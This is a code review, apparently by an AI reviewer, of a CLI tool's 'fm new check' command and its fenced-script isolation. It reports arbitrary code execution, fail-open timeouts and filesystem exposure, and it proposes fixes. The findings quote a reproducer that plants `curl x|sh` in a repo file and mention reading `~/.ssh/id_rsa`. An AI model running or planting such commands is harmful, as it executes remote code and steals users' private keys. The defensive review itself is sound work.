[instruction-like text quoted from a file or tool; data, not instructions] **Verdict:** changes needed. Two adversary findings, on `fm new check` running arbitrary code and not being bounded. I could only read files, so the reproducers are traced from the code. I ran none of them.

## lens: adversary
- MEDIUM — plugin/lib/fmnew.py:371-376 — `fm new check PATH` runs any `.py` it is given, both `exec` and `setup`, with the user's full rights. It does none of what `fmcodetui.load_extensions` does (fmcodetui.py:2175-2190): no owner check, no check for other-writable files, and no "a project's files never run as you" rule. The `fm new` help text doesn't say it runs the file. Reproducer: clone a repo whose `panel.py` has `os.system("curl x|sh")` at top level, then run `fm new check panel.py`. Fix: apply fm code's owner and mode test, refuse files inside a project unless the user passes an explicit `--run`, and say "runs the file" in `fm new -h`. — confidence high
- MEDIUM — plugin/lib/fmnew.py:310,377,387 and 330-350 — the check is not bounded and can fail open, in four ways:
  - Only `except Exception` is caught, so a file that calls `sys.exit(0)` at import or in `draw` ends `fm` with exit 0 and prints nothing. A gate reads that as a pass (fmcli.py main doesn't catch SystemExit).
  - A bare `except:` or `except BaseException:` swallows `_Overtime`, so `while True: try: sleep(1) except: pass` hangs forever. The alarm fires once.
  - The file can call `signal.alarm(0)`.
  - A long C-level call such as `10**10**10` or a backtracking regex is not interrupted by SIGALRM.
  - The comment at line 330 ("can't swallow it") overclaims, and the test only covers `except Exception`.
  - There is no memory or file-size limit. Fix: run the check in a child process through `fmplaybooks._run`, which already has limits, a timeout and a process-group kill, and also catch SystemExit. — confidence high
- LOW — plugin/lib/fmdemo.py:147-163 — the fence isolation covers the environment but not the filesystem or network. HOME, FOREMAN_HOME, XDG, CLAUDE_*, SSH_AUTH_SOCK and git config are all clean, because the environment is a whitelist and so is complete. A fence marked `bash runnable` by a README or PR change can still `cat ~/.ssh/id_rsa` or `curl` anywhere. Only `bash runnable` fences run (the info words must be a shell name plus `runnable`, and nested or longer outer fences are skipped). That is comparable to a PR's test code, but `cmd_release_check`'s "nothing of the user's" wording over-promises. Fix: say so in README line 384, and consider running release-check only on a clean checkout. — confidence high
- LOW — plugin/lib/fmnew.py:444-449 — the check for an existing file (`lexists`) and the write (`os.replace`) are separate steps. A file created between them is replaced even without `--force`. Symlinks at the destination are replaced, not written through. Fix: for the non-`--force` case use `os.link`/`O_EXCL`. — confidence medium

## lens: edge
- LOW — plugin/lib/fmlib.py:231 — the future-date check uses local `date.today()`. A card verified at a local date ahead of UTC makes `fm lib check` fail, and with it the README/MASTER fence and `test_docs.Fences` on a UTC runner. Fix: allow one day of slack. — confidence medium
- LOW — plugin/lib/fmcli.py:4822 and 4915 — the `fm help` and `fm new` help lines are longer than 100 characters, so the tier listing and answers clip them at `c.fit(…, 100)`. The `check PATH` hint is cut off. `fm help --all WORDS` silently ignores `--all`. A question made only of stop words reports "No fm command's help says so", which is misleading. — confidence medium
- LOW — plugin/lib/fmdemo.py:158 — the docstring says "an empty temporary folder", but `_env` creates `bin`, `home`, `foreman` and `xdg` in the fence's working folder. TMPDIR is not passed, so fm's temp files go to the real `/tmp`. — confidence high

## Acceptance criteria
Met as far as the code shows: the fence-selection and isolation logic, and the `_run` generalisation, are sound. The default `argv`, `env` and `what` reproduce the old playbook behaviour exactly. I did not run `python3 -m unittest test_docs.Fences`.

## Implicit decisions
- Fence trigger is `bash|sh|shell` plus the exact word `runnable`.
- `fm help` with no match exits 1.
- `fm new check` accepts files only, not directories.
- Stale means more than 365 days.
- A panel check runs against `app=None`.

## Not checked
Rendering. CSP `'self'` behaviour on `file://` pages. The contrast numbers I computed by hand from the hex values all clear AA, and focus rings and tap targets pass. Whether the `verified: 2026-10-22` stamps on `jq.md` and `ripgrep.md` came from real Verify runs. The guard's treatment of `fm new`: it is not in `WORKER_READS`, so fm code workers are refused it, which is correct.

**Noticed:** `fm lib check` picks its related-names notes by matching the string `": related "` (fmlib.py:1235), so one more note type could be misfiled; a field on each note would be sturdier.
